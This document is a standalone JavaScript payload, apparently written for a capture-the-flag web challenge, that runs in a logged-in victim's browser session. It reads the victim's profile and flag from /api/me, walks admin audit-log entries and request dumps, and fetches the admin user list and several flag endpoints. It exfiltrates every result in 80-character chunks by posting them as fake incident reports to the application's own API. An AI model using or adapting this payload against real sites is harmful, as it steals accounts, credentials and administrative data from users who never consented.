(async () => {
  const O = self.location.origin;
  const P = t => fetch(O + '/api/incidents', {
    method: 'POST', credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
  }).catch(() => {});

  try {
    const me = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
    const u = me.user || {};
    await P('LDET2|ME|' + JSON.stringify({ id: u.id, role: u.role, email: u.email, flag: u.flag }).slice(0, 90));
  } catch (e) { await P('LDET2|MEERR|' + e); }

  for (let id = 1; id <= 30; id++) {
    try {
      const r = await fetch(O + '/api/admin/audit?log=' + id, { credentials: 'same-origin' });
      const j = await r.json();
      const e = j.entry || j;
      if (e.request_dump) {
        const s = JSON.stringify({ id, actor: e.actor, action: e.action, dump: e.request_dump });
        const n = Math.ceil(s.length / 80);
        for (let i = 0; i < n && i < 8; i++)
          await P('LDET2|RD|' + id + '|' + (i + 1) + '/' + n + '|' + s.slice(i * 80, (i + 1) * 80));
      } else {
        await P('LDET2|RS|' + id + '|' + (e.actor || '').slice(0, 30) + '|' + (e.action || '') + '|' + (e.detail || '').slice(0, 25));
      }
    } catch (ex) { await P('LDET2|RE|' + id + '|' + String(ex).slice(0, 60)); }
  }

  try {
    const r = await fetch(O + '/api/admin/users', { credentials: 'same-origin' });
    const j = await r.json();
    const s = JSON.stringify(j).slice(0, 500);
    const n = Math.ceil(s.length / 80);
    for (let i = 0; i < n && i < 8; i++)
      await P('LDET2|AU|' + (i + 1) + '/' + n + '|' + s.slice(i * 80, (i + 1) * 80));
  } catch (e) { await P('LDET2|AUERR|' + e); }

  for (const ep of ['/flag', '/api/flag', '/api/admin/flag', '/api/pwned']) {
    try {
      const r = await fetch(O + ep, { credentials: 'same-origin' });
      const t = await r.text();
      await P('LDET2|EP|' + ep + '|' + r.status + '|' + t.slice(0, 60));
    } catch (e) { await P('LDET2|EP|' + ep + '|ERR|' + e); }
  }

  await P('LDET2|DONE');
})();
